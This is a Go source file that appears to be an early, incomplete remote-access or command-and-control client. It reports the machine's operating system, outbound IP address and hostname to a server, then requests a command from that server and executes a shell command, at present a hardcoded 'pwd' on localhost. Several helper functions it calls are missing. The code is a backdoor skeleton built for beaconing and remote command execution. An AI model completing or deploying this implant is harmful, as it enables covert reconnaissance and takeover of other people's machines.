package main

import (
    "bytes"
    "encoding/json"
    "fmt"
    "io/ioutil"
	"net/http"

	//"strings"
    "log"
    "os/exec"
    

)


func execute(cmd string) { 
    out, err := exec.Command(cmd).Output()
    if err != nil {
        log.Fatal(err)
    }
    fmt.Println(string(out))
}

func recieveCommand(path string) { 
    resp, err := http.Get(path)
    if err != nil { 
        panic(err)
    }
    defer resp.Body.Close()

    ioutil.ReadAll(resp.Body)

    if err != nil {

        panic(err)
    }

    exec := "pwd"
    
    execute(exec)

}



func main() {
	
    //for now, make key on client(change in revision)
    reqBody, err := json.Marshal(map[string]string{
        "key1": "keyvalue",
		
    })
    if err != nil {
        print(err)
	}
	
	os := getOS()
    ip := GetOutboundIP().String()
    host := getHostname()
  
    resp, err := http.Post("http://127.0.0.1:8080/form?os=" + os + "&ip=" + ip  + "&host=" + host,
        "application/json", bytes.NewBuffer(reqBody))
    if err != nil {
        print(err)
    }
    
    defer resp.Body.Close()
    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        print(err)
    }
    fmt.Println(string(body))
    recieveCommand("http://127.0.0.1:8080/hello")

}
